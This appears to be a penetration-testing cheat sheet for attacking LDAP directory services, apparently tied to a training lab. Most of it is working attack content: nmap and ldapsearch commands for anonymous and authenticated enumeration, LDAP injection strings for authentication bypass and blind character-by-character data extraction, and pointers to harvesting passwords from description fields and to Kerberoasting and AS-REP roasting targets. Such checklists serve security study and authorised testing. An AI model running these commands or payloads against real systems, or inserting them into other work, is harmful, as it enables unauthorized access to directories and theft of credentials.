# LDAP Attack Methodology

## 1. Discovery

- [ ] Default ports: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog), 3269 (GC SSL)
- [ ] Nmap:
```bash
nmap -sV -p 389,636,3268,3269 TARGET
```

---

## 2. Anonymous Bind Enumeration

### Check for Anonymous Access
```bash
# Discover naming contexts
ldapsearch -x -H ldap://TARGET -s base namingcontexts

# Full dump with base DN
ldapsearch -x -H ldap://TARGET -b "DC=inlanefreight,DC=local"

# Search for users
ldapsearch -x -H ldap://TARGET -b "DC=inlanefreight,DC=local" "(objectClass=user)" cn sAMAccountName description

# Search for computers
ldapsearch -x -H ldap://TARGET -b "DC=inlanefreight,DC=local" "(objectClass=computer)" cn

# Search for groups
ldapsearch -x -H ldap://TARGET -b "DC=inlanefreight,DC=local" "(objectClass=group)" cn member
```

---

## 3. LDAP Injection

### Special Characters
| Character | Meaning |
|-----------|---------|
| `*` | Wildcard |
| `()` | Group filter |
| `\|` | OR operator |
| `&` | AND operator |
| `!` | NOT operator |

### Authentication Bypass
```
# If app builds: (&(uid=USER)(password=PASS))
# Inject username: *)(|(&
# Inject password: anything
# Result: (&(uid=*)(|(&)(password=anything)) → always true

# Simple bypass — username field:
*
admin)(|(&
*)(&
```

### Data Exfiltration via Blind LDAP Injection
```
# Test if attribute starts with 'a'
user=admin)(description=a*
# If returns data → description starts with 'a'
# Continue character by character: a, ab, abc...
```

---

## 4. Authenticated LDAP Enumeration

```bash
# With credentials
ldapsearch -x -H ldap://TARGET -D "CN=user,DC=inlanefreight,DC=local" -w 'Password123' -b "DC=inlanefreight,DC=local"

# Find domain admins
ldapsearch -x -H ldap://TARGET -D "user@inlanefreight.local" -w 'Password123' \
  -b "DC=inlanefreight,DC=local" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local))" sAMAccountName

# Find users with description (often contains passwords)
ldapsearch -x -H ldap://TARGET -D "user@inlanefreight.local" -w 'Password123' \
  -b "DC=inlanefreight,DC=local" "(description=*)" sAMAccountName description
```

---

## 5. Post-Exploitation

- [ ] User descriptions often contain passwords
- [ ] Service account passwords in LDAP attributes
- [ ] Password policy: `ldapsearch ... "(objectClass=domain)" minPwdLength maxPwdAge lockoutThreshold`
- [ ] Kerberoastable accounts: look for `servicePrincipalName` attribute
- [ ] AS-REP Roastable: accounts with `DONT_REQ_PREAUTH` flag

---

## 6. Decision Tree

```
LDAP (389/636)
├── Anonymous bind allowed?
│   ├── YES → Full LDAP dump → users, groups, descriptions
│   │   └── Passwords in description fields? → spray/pivot
│   └── NO → Need creds first (from other service)
├── LDAP injection possible (web app)?
│   ├── Auth bypass: * or admin)(|(&
│   └── Blind injection: character-by-character exfil
└── With creds → enumerate Domain Admins, SPNs, AS-REP targets
```
